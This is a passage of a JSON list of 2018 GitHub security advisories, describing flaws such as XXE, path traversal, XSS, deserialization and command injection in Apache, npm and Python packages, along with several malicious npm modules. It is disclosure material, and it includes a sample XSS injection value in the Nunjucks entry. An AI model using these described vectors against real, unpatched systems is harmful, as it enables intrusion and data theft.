    "summary": "Moderate severity vulnerability that affects org.apache.oozie:oozie-core"
  },
  {
    "ghsaId": "GHSA-8r8j-xvfj-36f9",
    "publishedAt": "2018-12-19T19:25:14Z",
    "description": "ymlref allows code injection.",
    "summary": "High severity vulnerability that affects ymlref"
  },
  {
    "ghsaId": "GHSA-8j39-fgfp-vxh8",
    "publishedAt": "2018-12-19T19:25:04Z",
    "description": "An issue was discovered in XXL-CONF 1.6.0. There is a path traversal vulnerability via ../ in the keys parameter that can download any configuration file, related to ConfController.java and PropUtil.java.",
    "summary": "Moderate severity vulnerability that affects com.xuxueli:xxl-conf"
  },
  {
    "ghsaId": "GHSA-5p52-j8pw-j7x5",
    "publishedAt": "2018-12-19T19:24:52Z",
    "description": "Apereo Bedework bw-webdav before 4.0.3 allows XXE attacks, as demonstrated by an invite-reply document that reads a local file, related to webdav/servlet/common/MethodBase.java and webdav/servlet/common/PostRequestPars.java.",
    "summary": "Moderate severity vulnerability that affects org.bedework:bw-webdav"
  },
  {
    "ghsaId": "GHSA-rmm5-g63h-m6g9",
    "publishedAt": "2018-12-19T19:24:39Z",
    "description": "jaxb/JaxbEngine.java in Pippo 1.11.0 allows XXE.",
    "summary": "Moderate severity vulnerability that affects ro.pippo:pippo-core"
  },
  {
    "ghsaId": "GHSA-9fcp-vcq9-9h2h",
    "publishedAt": "2018-12-19T19:24:18Z",
    "description": "A Server-Side Template Injection issue was discovered in Crafter CMS 3.0.18. Attackers with developer privileges may execute OS commands by Creating/Editing a template file (.ftl filetype) that triggers a call to freemarker.template.utility.Execute in the FreeMarker library during rendering of a web page.",
    "summary": "Moderate severity vulnerability that affects org.craftercms:crafter-studio"
  },
  {
    "ghsaId": "GHSA-mxr5-p36v-479m",
    "publishedAt": "2018-12-19T19:24:03Z",
    "description": "Arbitrary file upload in jQuery Upload File <= 4.0.2",
    "summary": "Moderate severity vulnerability that affects jquery-file-upload"
  },
  {
    "ghsaId": "GHSA-894g-6j7q-2hx6",
    "publishedAt": "2018-12-19T19:23:52Z",
    "description": "helpers.py in Flask-Admin 1.5.2 has Reflected XSS via a crafted URL.",
    "summary": "High severity vulnerability that affects flask-admin"
  },
  {
    "ghsaId": "GHSA-cq27-v7xp-c356",
    "publishedAt": "2018-12-14T18:51:38Z",
    "description": "Heap-based buffer overflow in the ALGnew function in block_templace.c in Python Cryptography Toolkit (aka pycrypto) allows remote attackers to execute arbitrary code as demonstrated by a crafted iv parameter to cryptmsg.py.",
    "summary": "Moderate severity vulnerability that affects pycrypto"
  },
  {
    "ghsaId": "GHSA-www2-v7xj-xrc6",
    "publishedAt": "2018-12-12T15:52:07Z",
    "description": "urllib3 before version 1.23 does not remove the Authorization HTTP header when following a cross-origin redirect (i.e., a redirect that differs in host, port, or scheme). This can allow for credentials in the Authorization header to be exposed to unintended hosts or transmitted in cleartext.",
    "summary": "High severity vulnerability that affects urllib3"
  },
  {
    "ghsaId": "GHSA-vwr2-wj63-86gr",
    "publishedAt": "2018-12-06T15:49:10Z",
    "description": "A Path Traversal in simplehttpserver versions <=0.2.1 allows to list any file in another folder of web root.",
    "summary": "High severity vulnerability that affects simplehttpserver"
  },
  {
    "ghsaId": "GHSA-q2qw-rmrh-vv42",
    "publishedAt": "2018-12-05T17:24:27Z",
    "description": "A Broken Access Control vulnerability in Active Job versions >= 4.2.0 allows an attacker to craft user input which can cause Active Job to deserialize it using GlobalId and give them access to information that they should not have.",
    "summary": "Moderate severity vulnerability that affects activejob"
  },
  {
    "ghsaId": "GHSA-7rr7-rcjw-56vj",
    "publishedAt": "2018-12-05T17:17:02Z",
    "description": "A bypass vulnerability in Active Storage >= 5.2.0 for Google Cloud Storage and Disk services allow an attacker to modify the `content-disposition` and `content-type` parameters which can be used in with HTML files and have them executed inline. Additionally, if combined with other techniques such as cookie bombing and specially crafted AppCache manifests, an attacker can gain access to private signed URLs within a specific storage path.",
    "summary": "High severity vulnerability that affects activestorage"
  },
  {
    "ghsaId": "GHSA-32w7-9whp-cjp9",
    "publishedAt": "2018-11-29T21:30:56Z",
    "description": "The client in Tryton 5.x before 5.0.1 tries to make a connection to the bus in cleartext instead of encrypted under certain circumstances in bus.py and jsonrpc.py. This connection attempt fails, but it contains in the header the current session of the user. This session could then be stolen by a man-in-the-middle.",
    "summary": "High severity vulnerability that affects tryton"
  },
  {
    "ghsaId": "GHSA-q3jg-4c82-j4xh",
    "publishedAt": "2018-11-29T21:30:30Z",
    "description": "Pivotal CredHub Service Broker, versions prior to 1.1.0, uses a guessable form of random number generation in creating service broker's UAA client. A remote malicious user may guess the client secret and obtain or modify credentials for users of the CredHub Service.",
    "summary": "Moderate severity vulnerability that affects org.springframework.credhub:spring-credhub-core"
  },
  {
    "ghsaId": "GHSA-mh6f-8j2x-4483",
    "publishedAt": "2018-11-26T23:58:21Z",
    "description": "The NPM package `flatmap-stream` is considered malicious.  A malicious actor added this package as a dependency to the NPM `event-stream` package in version `3.3.6`.  Users of `event-stream` are encouraged to downgrade to the last non-malicious version, `3.3.4`, or upgrade to the latest  4.x version. \r\n\r\nUsers of `flatmap-stream` are encouraged to remove the dependency entirely.\r\n",
    "summary": "Critical severity vulnerability that affects event-stream and flatmap-stream"
  },
  {
    "ghsaId": "GHSA-rrfq-g5fq-fc9c",
    "publishedAt": "2018-11-21T22:25:04Z",
    "description": "In Apache Hive 2.3.3, 3.1.0 and earlier, local resources on HiveServer2 machines are not properly protected against malicious user if ranger, sentry or sql standard authorizer is not in use.",
    "summary": "Moderate severity vulnerability that affects org.apache.hive:hive-exec"
  },
  {
    "ghsaId": "GHSA-jmf4-pq78-f8vj",
    "publishedAt": "2018-11-21T22:24:50Z",
    "description": "In Apache Hive 2.3.3, 3.1.0 and earlier, Hive \"EXPLAIN\" operation does not check for necessary authorization of involved entities in a query. An unauthorized user can do \"EXPLAIN\" on arbitrary table or view and expose table metadata and statistics.",
    "summary": "Moderate severity vulnerability that affects org.apache.hive:hive-jdbc"
  },
  {
    "ghsaId": "GHSA-jf2m-435m-mxw8",
    "publishedAt": "2018-11-21T22:24:34Z",
    "description": "This vulnerability in Apache Hive JDBC driver 0.7.1 to 2.3.2 allows carefully crafted arguments to be used to bypass the argument escaping/cleanup that JDBC driver does in PreparedStatement implementation.",
    "summary": "High severity vulnerability that affects org.apache.hive:hive-jdbc"
  },
  {
    "ghsaId": "GHSA-rxmr-c9jm-7mm8",
    "publishedAt": "2018-11-21T22:24:22Z",
    "description": "In Apache Hive 0.6.0 to 2.3.2, malicious user might use any xpath UDFs (xpath/xpath_string/xpath_boolean/xpath_number/xpath_double/xpath_float/xpath_long/xpath_int/xpath_short) to expose the content of a file on the machine running HiveServer2 owned by HiveServer2 user (usually hive) if hive.server2.enable.doAs=false.",
    "summary": "Moderate severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service"
  },
  {
    "ghsaId": "GHSA-p639-xxv5-j383",
    "publishedAt": "2018-11-21T22:24:08Z",
    "description": "In Apache Hive 2.1.0 to 2.3.2, when 'COPY FROM FTP' statement is run using HPL/SQL extension to Hive, a compromised/malicious FTP server can cause the file to be written to an arbitrary location on the cluster where the command is run from. This is because FTP client code in HPL/SQL does not verify the destination location of the downloaded file. This does not affect hive cli user and hiveserver2 user as hplsql is a separate command line script and needs to be invoked differently.",
    "summary": "Moderate severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service"
  },
  {
    "ghsaId": "GHSA-83r3-c79w-f6wc",
    "publishedAt": "2018-11-21T22:23:49Z",
    "description": "The authorization framework in Apache Hive 1.0.0, 1.0.1, 1.1.0, 1.1.1, 1.2.0 and 1.2.1, on clusters protected by Ranger and SqlStdHiveAuthorization, allows attackers to bypass intended parent table access restrictions via unspecified partition-level operations.",
    "summary": "High severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service"
  },
  {
    "ghsaId": "GHSA-w4x9-4f5x-8jj8",
    "publishedAt": "2018-11-21T22:23:29Z",
    "description": "Apache Hive before 0.13.1, when in SQL standards based authorization mode, does not properly check the file permissions for (1) import and (2) export statements, which allows remote authenticated users to obtain sensitive information via a crafted URI.",
    "summary": "Low severity vulnerability that affects      org.apache.hive:hive-exec, org.apache.hive:hive, and org.apache.hive:hive-service"
  },
  {
    "ghsaId": "GHSA-vqgp-4jgj-5j64",
    "publishedAt": "2018-11-21T22:23:04Z",
    "description": "Py-EVM v0.2.0-alpha.33 allows attackers to make a vm.execute_bytecode call that triggers computation._stack.values with '\"stack\": [100, 100, 0]' where b'\\x' was expected, resulting in an execution failure because of an invalid opcode. This is reportedly related to \"smart contracts can be executed indefinitely without gas being paid.\"",
    "summary": "Low severity vulnerability that affects py-evm"
  },
  {
    "ghsaId": "GHSA-2mw7-wggm-m6w3",
    "publishedAt": "2018-11-21T22:22:46Z",
    "description": "ethereumjs-vm 2.4.0 allows attackers to cause a denial of service (vm.runCode failure and REVERT) via a \"code: Buffer.from(my_code, 'hex')\" attribute.",
    "summary": "Low severity vulnerability that affects ethereumjs-vm"
  },
  {
    "ghsaId": "GHSA-xvch-r4wf-h8w9",
    "publishedAt": "2018-11-21T22:22:21Z",
    "description": "The Apache Qpid Proton-J transport includes an optional wrapper layer to perform TLS, enabled by use of the 'transport.ssl(...)' methods. Unless a verification mode was explicitly configured, client and server modes previously defaulted as documented to not verifying a peer certificate, with options to configure this explicitly or select a certificate verification mode with or without hostname verification being performed. The latter hostname verifying mode was not implemented in Apache Qpid Proton-J versions 0.3 to 0.29.0, with attempts to use it resulting in an exception. This left only the option to verify the certificate is trusted, leaving such a client vulnerable to Man In The Middle (MITM) attack. Uses of the Proton-J protocol engine which do not utilise the optional transport TLS wrapper are not impacted, e.g. usage within Qpid JMS. Uses of Proton-J utilising the optional transport TLS wrapper layer that wish to enable hostname verification must be upgraded to version 0.30.0 or later and utilise the VerifyMode#VERIFY_PEER_NAME configuration, which is now the default for client mode usage unless configured otherwise.",
    "summary": "Moderate severity vulnerability that affects org.apache.qpid:proton-j"
  },
  {
    "ghsaId": "GHSA-wg85-p6j7-gp3w",
    "publishedAt": "2018-11-21T22:21:25Z",
    "description": "SimpleMDE 1.11.2 has XSS via an onerror attribute of a crafted IMG element, or via certain input with [ and ( characters, which is mishandled during construction of an A element.",
    "summary": "Moderate severity vulnerability that affects simplemde"
  },
  {
    "ghsaId": "GHSA-5xgh-643p-cp2g",
    "publishedAt": "2018-11-21T22:19:59Z",
    "description": "An issue was discovered in YMFE YApi 1.3.23. There is stored XSS in the name field of a project.",
    "summary": "Moderate severity vulnerability that affects yapi-vendor"
  },
  {
    "ghsaId": "GHSA-g68x-vvqq-pvw3",
    "publishedAt": "2018-11-21T22:19:50Z",
    "description": "CKEditor 4.x before 4.11.0 allows user-assisted XSS involving a source-mode paste.",
    "summary": "Moderate severity vulnerability that affects ckeditor"
  },
  {
    "ghsaId": "GHSA-hhrp-qm88-xjr3",
    "publishedAt": "2018-11-21T22:19:41Z",
    "description": "An issue was discovered in Valine v1.3.3. It allows HTML injection, which can be exploited for JavaScript execution via an EMBED element in conjunction with a .pdf file.",
    "summary": "Moderate severity vulnerability that affects valine"
  },
  {
    "ghsaId": "GHSA-phg2-9c5g-m4q7",
    "publishedAt": "2018-11-21T22:19:30Z",
    "description": "In all versions of Apache Spark, its standalone resource manager accepts code to execute on a 'master' host, that then runs that code on 'worker' hosts. The master itself does not, by design, execute user code. A specially-crafted request to the master can, however, cause the master to execute code too. Note that this does not affect standalone clusters with authentication enabled. While the master host typically has less outbound access to other resources than a worker, the execution of code on the master is nevertheless unexpected.\r\n\r\n# Mitigation\r\nEnable authentication on any Spark standalone cluster that is not otherwise secured from unwanted access, for example by network-level restrictions. Use spark.authenticate and related security properties described at https://spark.apache.org/docs/latest/security.html",
    "summary": "Low severity vulnerability that affects org.apache.spark:spark-core_2.10 and org.apache.spark:spark-core_2.11"
  },
  {
    "ghsaId": "GHSA-3p4q-x8f3-p7vq",
    "publishedAt": "2018-11-21T22:19:22Z",
    "description": "Jupyter Notebook before 5.7.2 allows XSS via a crafted directory name because notebook/static/tree/js/notebooklist.js handles certain URLs unsafely.",
    "summary": "Moderate severity vulnerability that affects notebook"
  },
  {
    "ghsaId": "GHSA-49qr-xh3w-h436",
    "publishedAt": "2018-11-21T22:15:47Z",
    "description": "Jupyter Notebook before 5.7.1 allows XSS via an untrusted notebook because nbconvert responses are considered to have the same origin as the notebook server. In other words, nbconvert endpoints can execute JavaScript with access to the server API. In notebook/nbconvert/handlers.py, NbconvertFileHandler and NbconvertPostHandler do not set a Content Security Policy to prevent this.",
    "summary": "Moderate severity vulnerability that affects notebook"
  },
  {
    "ghsaId": "GHSA-5r2p-j47h-mhpg",
    "publishedAt": "2018-11-15T15:59:08Z",
    "description": "There is a possible XSS vulnerability in Rack before 2.0.6 and 1.6.11. Carefully crafted requests can impact the data returned by the `scheme` method on `Rack::Request`. Applications that expect the scheme to be limited to 'http' or 'https' and do not escape the return value could be vulnerable to an XSS attack. Note that applications using the normal escaping mechanisms provided by Rails may not impacted, but applications that bypass the escaping mechanisms, or do not use them may be vulnerable.",
    "summary": "Moderate severity vulnerability that affects rack"
  },
  {
    "ghsaId": "GHSA-hg78-4f6x-99wq",
    "publishedAt": "2018-11-15T15:58:58Z",
    "description": "There is a possible DoS vulnerability in the multipart parser in Rack before 2.0.6. Specially crafted requests can cause the multipart parser to enter a pathological state, causing the parser to use CPU resources disproportionate to the request size.",
    "summary": "Moderate severity vulnerability that affects rack"
  },
  {
    "ghsaId": "GHSA-3rhm-67j6-42jq",
    "publishedAt": "2018-11-09T17:50:40Z",
    "description": "A time-sensitive equality check on the JWT signature in the JsonWebToken.validate method in main/scala/authentikat/jwt/JsonWebToken.scala in authentikat-jwt (aka com.jason-goodwin/authentikat-jwt) version 0.4.5 and earlier allows the supplier of a JWT token to guess bit after bit of the signature by repeating validation requests.",
    "summary": "Moderate severity vulnerability that affects com.jason-goodwin:authentikat-jwt_2.12"
  },
  {
    "ghsaId": "GHSA-ghgj-3xqr-6jfm",
    "publishedAt": "2018-11-09T17:50:00Z",
    "description": "The exception handling code in Eclipse Jetty before 9.2.9.v20150224 allows remote attackers to obtain sensitive information from process memory via illegal characters in an HTTP header, aka JetLeak.",
    "summary": "Moderate severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-cfw5-v7cw-69cw",
    "publishedAt": "2018-11-09T17:49:49Z",
    "description": "In Apache LDAP API before 1.0.2, a bug in the way the SSL Filter was setup made it possible for another thread to use the connection before the TLS layer has been established, if the connection has already been used and put back in a pool of connections, leading to leaking any information contained in this request (including the credentials when sending a BIND request).",
    "summary": "Critical severity vulnerability that affects org.apache.directory.api:apache-ldap-api"
  },
  {
    "ghsaId": "GHSA-q257-vv4p-fg92",
    "publishedAt": "2018-11-09T17:49:34Z",
    "description": "Http-signature is a \"Reference implementation of Joyent's HTTP Signature Scheme\". In versions <=0.9.11, http-signature signs only the header values, but not the header names. This makes http-signature vulnerable to header forgery. Thus, if an attacker can intercept a request, he can swap header names and change the meaning of the request without changing the signature.",
    "summary": "Moderate severity vulnerability that affects http-signature"
  },
  {
    "ghsaId": "GHSA-3rh7-vm4x-q2hp",
    "publishedAt": "2018-11-09T17:49:22Z",
    "description": "`sqlserver` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects sqlserver"
  },
  {
    "ghsaId": "GHSA-hfj4-96f7-6r5g",
    "publishedAt": "2018-11-09T17:49:11Z",
    "description": "html-janitor node module suffers from a Cross-Site Scripting (XSS) vulnerability via clean() accepting user-controlled values.",
    "summary": "Moderate severity vulnerability that affects html-janitor"
  },
  {
    "ghsaId": "GHSA-9p47-w5xp-f4xr",
    "publishedAt": "2018-11-09T17:48:37Z",
    "description": "windows-build-tools is a module for installing C++ Build Tools for Windows using npm. windows-build-tools versions below 1.0.0 download resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Moderate severity vulnerability that affects windows-build-tools"
  },
  {
    "ghsaId": "GHSA-q69p-5h74-w36f",
    "publishedAt": "2018-11-09T17:48:34Z",
    "description": "Mapbox.js versions 1.x prior to 1.6.6 and 2.x prior to 2.2.4 are vulnerable to a cross-site-scripting attack in certain uncommon usage scenarios via TileJSON name and map share control",
    "summary": "Moderate severity vulnerability that affects mapbox.js"
  },
  {
    "ghsaId": "GHSA-mrmf-qwxg-7c3h",
    "publishedAt": "2018-11-09T17:48:20Z",
    "description": "Remarkable is a markdown parser. In versions 1.6.2 and lower, remarkable allows the use of `data:` URIs in links and can therefore execute javascript.",
    "summary": "Moderate severity vulnerability that affects remarkable"
  },
  {
    "ghsaId": "GHSA-9xw9-pvgv-6p76",
    "publishedAt": "2018-11-09T17:47:52Z",
    "description": "Http-proxy is a proxying library. Because of the way errors are handled in versions before 0.7.0, an attacker that forces an error can crash the server, causing a denial of service.",
    "summary": "Moderate severity vulnerability that affects http-proxy"
  },
  {
    "ghsaId": "GHSA-qr28-7j6p-9hmv",
    "publishedAt": "2018-11-09T17:47:45Z",
    "description": "Mapbox.js versions 1.x prior to 1.6.5 and 2.x prior to 2.1.7 are vulnerable to a cross-site-scripting attack in certain uncommon usage scenarios via TileJSON Name.",
    "summary": "Moderate severity vulnerability that affects mapbox.js"
  },
  {
    "ghsaId": "GHSA-xc6g-ggrc-qq4r",
    "publishedAt": "2018-11-09T17:47:23Z",
    "description": "Sanitize-html is a library for scrubbing html input of malicious values. Versions 1.11.1 and below are vulnerable to cross site scripting (XSS) in certain scenarios: If allowed at least one nonTextTags, the result is a potential XSS vulnerability.",
    "summary": "Moderate severity vulnerability that affects sanitize-html"
  },
  {
    "ghsaId": "GHSA-f89g-whpf-6q9m",
    "publishedAt": "2018-11-09T17:46:56Z",
    "description": "i18next is a language translation framework. Because of how the interpolation is implemented, making replacements from the dictionary one at a time, untrusted user input can use the name of one of the dictionary keys to inject script into the browser. This affects i18next <=1.10.2.",
    "summary": "Moderate severity vulnerability that affects i18next"
  },
  {
    "ghsaId": "GHSA-fwx5-5fqj-jv98",
    "publishedAt": "2018-11-09T17:46:30Z",
    "description": "Morris.js creates an svg graph, with labels that appear when hovering over a point. The hovering label names are not escaped in versions 0.5.0 and earlier. If control over the labels is obtained, script can be injected. The script will run on the client side whenever that specific graph is loaded.",
    "summary": "Moderate severity vulnerability that affects morris.js"
  },
  {
    "ghsaId": "GHSA-vwjj-2852-3765",
    "publishedAt": "2018-11-09T17:46:27Z",
    "description": "Forms is a library for easily creating HTML forms. Versions before 1.3.0 did not have proper html escaping. This means that if the application did not sanitize html on behalf of forms, use of forms may be vulnerable to cross site scripting",
    "summary": "Moderate severity vulnerability that affects forms"
  },
  {
    "ghsaId": "GHSA-wg96-3933-j2w5",
    "publishedAt": "2018-11-09T17:45:55Z",
    "description": "sanitize-html is a library for scrubbing html input for malicious values Versions 1.2.2 and below have a cross site scripting vulnerability.",
    "summary": "Moderate severity vulnerability that affects sanitize-html"
  },
  {
    "ghsaId": "GHSA-qw3g-35hc-fcrh",
    "publishedAt": "2018-11-09T17:45:38Z",
    "description": "Restify is a framework for building REST APIs. Restify >=2.0.0 <=4.0.4 using URL encoded script tags in a non-existent URL, an attacker can get script to run in some browsers.",
    "summary": "Moderate severity vulnerability that affects restify"
  },
  {
    "ghsaId": "GHSA-38h8-x697-gh8q",
    "publishedAt": "2018-11-09T17:45:30Z",
    "description": "Affected versions of sync-exec use files located in /tmp/ to buffer command results before returning values. As /tmp/ is almost always set with world readable permissions, this may allow low privilege users on the system to read the results of commands run via sync-exec under a higher privilege user.\r\n\r\nThere is currently no direct patch for sync-exec, as the child_process.execSync function provided in Node.js v0.12.0 and later provides the same functionality natively.\r\n\r\nThe best mitigation currently is to update to Node.js v0.12.0 or later, and migrate all uses of sync-exec to child_process.execSync().",
    "summary": "Moderate severity vulnerability that affects sync-exec"
  },
  {
    "ghsaId": "GHSA-xqqr-p362-6rmc",
    "publishedAt": "2018-11-09T17:44:20Z",
    "description": "hostr is a simple web server that serves up the contents of the current directory. There is a directory traversal vulnerability in hostr 2.3.5 and earlier that allows an attacker to read files outside the current directory by sending `../` in the url path for GET requests.",
    "summary": "Moderate severity vulnerability that affects hostr"
  },
  {
    "ghsaId": "GHSA-7xfp-9c55-5vqj",
    "publishedAt": "2018-11-09T17:44:01Z",
    "description": "Affected versions of request will disclose local system memory to remote systems in certain circumstances. When a multipart request is made, and the type of body is number, then a buffer of that size will be allocated and sent to the remote server as the body.",
    "summary": "Moderate severity vulnerability that affects request"
  },
  {
    "ghsaId": "GHSA-9fg5-f5pj-rwcc",
    "publishedAt": "2018-11-09T17:43:52Z",
    "description": "gruntcli was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects gruntcli"
  },
  {
    "ghsaId": "GHSA-3p8f-j2vw-7hw9",
    "publishedAt": "2018-11-09T17:43:44Z",
    "description": "mssql-node was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects mssql-node"
  },
  {
    "ghsaId": "GHSA-8rhc-48pp-52gr",
    "publishedAt": "2018-11-09T17:43:25Z",
    "description": "In Apache Spark 1.6.0 until 2.1.1, the launcher API performs unsafe deserialization of data received by its socket. This makes applications launched programmatically using the launcher API potentially vulnerable to arbitrary code execution by an attacker with access to any user account on the local machine. It does not affect apps run by spark-submit or spark-shell. The attacker would be able to execute code as the user that ran the Spark application. Users are encouraged to update to version 2.1.2, 2.2.0 or later.\r\n\r\n",
    "summary": "High severity vulnerability that affects org.apache.spark:spark-core_2.10 and org.apache.spark:spark-core_2.11"
  },
  {
    "ghsaId": "GHSA-r34r-f84j-5x4x",
    "publishedAt": "2018-11-09T17:43:08Z",
    "description": "In Apache Spark before 2.2.0, it is possible for an attacker to take advantage of a user's trust in the server to trick them into visiting a link that points to a shared Spark cluster and submits data including MHTML to the Spark master, or history server. This data, which could contain a script, would then be reflected back to the user and could be evaluated and executed by MS Windows-based clients. It is not an attack on Spark itself, but on the user, who may then execute the script inadvertently when viewing elements of the Spark web UIs.",
    "summary": "Moderate severity vulnerability that affects org.apache.spark:spark-core_2.10 and org.apache.spark:spark-core_2.11"
  },
  {
    "ghsaId": "GHSA-5mhv-9qw8-j63g",
    "publishedAt": "2018-11-09T17:43:03Z",
    "description": "mssql.js was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects mssql.js"
  },
  {
    "ghsaId": "GHSA-9xgh-xgw5-p5cw",
    "publishedAt": "2018-11-09T17:42:54Z",
    "description": "nodemssql was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects nodemssql"
  },
  {
    "ghsaId": "GHSA-f94m-mqhr-mc29",
    "publishedAt": "2018-11-09T17:42:26Z",
    "description": "Lightbend Spray spray-json through 1.3.4 allows remote attackers to cause a denial of service (resource consumption) because of Algorithmic Complexity during the parsing of a field composed of many decimal digits.",
    "summary": "Moderate severity vulnerability that affects io.spray:spray-json_2.10, io.spray:spray-json_2.11, and io.spray:spray-json_2.12"
  },
  {
    "ghsaId": "GHSA-w4r4-65mg-45x2",
    "publishedAt": "2018-11-09T17:41:46Z",
    "description": "From version 1.3.0 onward, Apache Spark's standalone master exposes a REST API for job submission, in addition to the submission mechanism used by spark-submit. In standalone, the config property 'spark.authenticate.secret' establishes a shared secret for authenticating requests to submit jobs via spark-submit. However, the REST API does not use this or any other authentication mechanism, and this is not adequately documented. In this case, a user would be able to run a driver program without authenticating, but not launch executors, using the REST API. This REST API is also used by Mesos, when set up to run in cluster mode (i.e., when also running MesosClusterDispatcher), for job submission. Future versions of Spark will improve documentation on these points, and prohibit setting 'spark.authenticate.secret' when running the REST APIs, to make this clear. Future 2.4.x versions will also disable the REST API by default in the standalone master by changing the default value of 'spark.master.rest.enabled' to 'false'.",
    "summary": "Moderate severity vulnerability that affects org.apache.spark:spark-core_2.10 and org.apache.spark:spark-core_2.11"
  },
  {
    "ghsaId": "GHSA-q8xj-8xg3-w432",
    "publishedAt": "2018-11-09T17:41:35Z",
    "description": "Lightbend Spray spray-json through 1.3.4 allows remote attackers to cause a denial of service (resource consumption) because of Algorithmic Complexity during the parsing of many JSON object fields (with keys that have the same hash code).",
    "summary": "Moderate severity vulnerability that affects io.spray:spray-json_2.10, io.spray:spray-json_2.11, and io.spray:spray-json_2.12"
  },
  {
    "ghsaId": "GHSA-x3g3-334f-q6h4",
    "publishedAt": "2018-11-09T17:41:15Z",
    "description": "pandao Editor.md 1.5.0 has DOM XSS via input starting with a \"<<\" substring, which is mishandled during construction of an A element.",
    "summary": "Moderate severity vulnerability that affects editor.md"
  },
  {
    "ghsaId": "GHSA-vxp9-wv2f-wqmw",
    "publishedAt": "2018-11-09T17:40:56Z",
    "description": "Versions of Superset prior to 0.23 used an unsafe load method from the pickle library to deserialize data leading to possible remote code execution. Note Superset 0.23 was released prior to any Superset release under the Apache Software Foundation.",
    "summary": "High severity vulnerability that affects superset"
  },
  {
    "ghsaId": "GHSA-hc9w-4p87-j549",
    "publishedAt": "2018-11-07T20:46:25Z",
    "description": "A prototype pollution attack in cached-path-relative versions <=1.0.1 allows an attacker to inject properties on Object.prototype which are then inherited by all the JS objects through the prototype chain causing a DoS attack.",
    "summary": "Moderate severity vulnerability that affects cached-path-relative"
  },
  {
    "ghsaId": "GHSA-qv2v-m59f-v5fw",
    "publishedAt": "2018-11-07T00:29:37Z",
    "description": "Socket.io is a realtime application framework that provides communication via websockets. Because socket.io 0.9.6 and earlier depends on `Math.random()` to create socket IDs, the IDs are predictable. An attacker is able to guess the socket ID and gain access to socket.io servers, potentially obtaining sensitive information.",
    "summary": "Moderate severity vulnerability that affects socket.io"
  },
  {
    "ghsaId": "GHSA-26q7-g57v-mxcp",
    "publishedAt": "2018-11-07T00:28:11Z",
    "description": "Shout is an IRC client. Because the `/topic` command in messages is unescaped, attackers have the ability to inject HTML scripts that will run in the victim's browser. Affects shout >=0.44.0 <=0.49.3.",
    "summary": "Moderate severity vulnerability that affects shout"
  },
  {
    "ghsaId": "GHSA-xgc9-9w4v-h33h",
    "publishedAt": "2018-11-06T23:17:27Z",
    "description": "An administrator with report and template entitlements in Apache Syncope 1.2.x before 1.2.11 and 2.0.x before 2.0.8 can use XSL Transformations (XSLT) to perform malicious operations, including but not limited to file read, file write, and code execution.",
    "summary": "High severity vulnerability that affects org.apache.syncope:syncope-core"
  },
  {
    "ghsaId": "GHSA-v3vf-2r98-xw8w",
    "publishedAt": "2018-11-06T23:17:25Z",
    "description": "An administrator with user search entitlements in Apache Syncope 1.2.x before 1.2.11 and 2.0.x before 2.0.8 can recover sensitive security values using the fiql and orderby parameters.",
    "summary": "High severity vulnerability that affects org.apache.syncope:syncope-core"
  },
  {
    "ghsaId": "GHSA-9h9c-f287-c6vp",
    "publishedAt": "2018-11-06T23:16:18Z",
    "description": "A malicious user with enough administration entitlements can inject html-like elements containing JavaScript statements into Connector names, Report names, AnyTypeClass keys and Policy descriptions. When another user with enough administration entitlements edits one of the Entities above via Admin Console, the injected JavaScript code is executed.",
    "summary": "High severity vulnerability that affects org.apache.syncope:syncope-core"
  },
  {
    "ghsaId": "GHSA-qfjv-998w-q48f",
    "publishedAt": "2018-11-06T23:15:46Z",
    "description": "An administrator with workflow definition entitlements can use DTD to perform malicious operations, including but not limited to file read, file write, and code execution.",
    "summary": "High severity vulnerability that affects org.apache.syncope:syncope-core"
  },
  {
    "ghsaId": "GHSA-wv26-rj8c-4r33",
    "publishedAt": "2018-11-06T23:15:13Z",
    "description": "CSRF exists in the Auth0 authentication service through 14591 if the Legacy Lock API flag is enabled.",
    "summary": "Moderate severity vulnerability that affects auth0-js"
  },
  {
    "ghsaId": "GHSA-r3vr-prwv-86g9",
    "publishedAt": "2018-11-06T23:14:39Z",
    "description": "The shell_quote function in python-gnupg 0.3.5 does not properly quote strings, which allows context-dependent attackers to execute arbitrary code via shell metacharacters in unspecified vectors, as demonstrated using \"$(\" command-substitution sequences, a different vulnerability than CVE-2014-1928.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7323.",
    "summary": "High severity vulnerability that affects python-gnupg"
  },
  {
    "ghsaId": "GHSA-c2fx-8r76-gh36",
    "publishedAt": "2018-11-06T23:14:22Z",
    "description": "python-gnupg before 0.3.5 allows context-dependent attackers to execute arbitrary commands via shell metacharacters in unspecified vectors.",
    "summary": "High severity vulnerability that affects python-gnupg"
  },
  {
    "ghsaId": "GHSA-f7ph-p5rv-phw2",
    "publishedAt": "2018-11-06T23:13:37Z",
    "description": "Nunjucks is a full featured templating engine for JavaScript. Versions 2.4.2 and lower have a cross site scripting (XSS) vulnerability in autoescape mode. In autoescape mode, all template vars should automatically be escaped. By using an array for the keys, such as `name[]=<script>alert(1)</script>`, it is possible to bypass autoescaping and inject content into the DOM.",
    "summary": "Moderate severity vulnerability that affects nunjucks"
  },
  {
    "ghsaId": "GHSA-2jc8-4r6g-282j",
    "publishedAt": "2018-11-06T23:13:02Z",
    "description": "The shell_quote function in python-gnupg 0.3.5 does not properly escape characters, which allows context-dependent attackers to execute arbitrary code via shell metacharacters in unspecified vectors, as demonstrated using \"\\\" (backslash) characters to form multi-command sequences, a different vulnerability than CVE-2014-1927.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7323.",
    "summary": "Moderate severity vulnerability that affects python-gnupg"
  },
  {
    "ghsaId": "GHSA-79mx-88w7-8f7q",
